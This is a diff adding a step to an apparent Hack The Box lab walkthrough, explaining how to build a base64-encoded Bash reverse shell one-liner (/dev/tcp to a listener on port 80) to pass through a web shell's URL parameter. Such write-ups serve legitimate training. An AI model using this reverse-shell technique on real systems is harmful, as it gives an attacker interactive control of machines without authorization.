@@ -1035,6 +1035,29 @@ With code execution confirmed, the next step is to upgrade from a one-shot web s
 listening on [any] 80 ...
 ```
 
+The listener is up and waiting. Leave this terminal open and move to Terminal 2.
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+**Terminal 2 — Generate the Payload**
+
+**Command:** `echo 'bash -i >& /dev/tcp/10.10.15.227/80 0>&1' | base64 -w0`
+
+**Breakdown:**
+
+- `bash -i >& /dev/tcp/10.10.15.227/80 0>&1`
+    - **Description:** A Bash reverse shell one-liner using `/dev/tcp` — a built-in Bash feature that opens a raw TCP connection to a specified host and port.
+    - **Purpose:** When executed on the target, this opens a connection back to our listener on port 80 and redirects the shell's input and output through that connection, giving us an interactive terminal on the remote machine.
+- `| base64 -w0`
+    - **Description:** Pipes the shell command through base64 encoding with no line wrapping (`-w0`).
+    - **Purpose:** The raw reverse shell contains special characters (`>&`, `&`) that would be misinterpreted or mangled when passed through a URL query parameter. Base64 encoding converts it to a safe alphanumeric string that survives the HTTP request intact.
+
+**Result:**
+
 ```shell
 ┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
 └─$ echo 'bash -i >& /dev/tcp/10.10.15.227/80 0>&1' | base64 -w0
